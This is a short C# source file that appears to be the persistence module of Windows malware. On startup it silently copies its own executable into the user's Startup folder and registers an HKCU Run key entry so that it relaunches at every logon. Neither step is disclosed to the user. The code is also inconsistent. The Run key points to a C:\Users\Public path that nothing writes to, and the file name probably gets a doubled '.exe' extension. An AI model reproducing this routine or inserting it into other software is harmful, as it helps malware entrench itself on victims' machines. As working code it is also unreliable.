using Microsoft.Win32;

namespace cevsn
{
    public class Pevsn
    {
        static string thisFile = System.AppDomain.CurrentDomain.FriendlyName + ".exe";

        static string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile;

        public Pevsn()
        {
            Copyitself();
            StrtUp();
        }

        public static void StrtUp()
        {
            RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true)!;
            key!.SetValue("Cevsn", "C:\\Users\\Public\\" + System.AppDomain.CurrentDomain.FriendlyName + ".exe");
        }

         public static void Copyitself()
        {

            string Filepath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile;

            try
            {
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile))
                {
                    System.IO.File.Copy(Path, Filepath);
                }
            }
            catch (Exception e) {
                Console.Write(e);
                Console.Write("Exception while copying...");
            }

        }
    }
}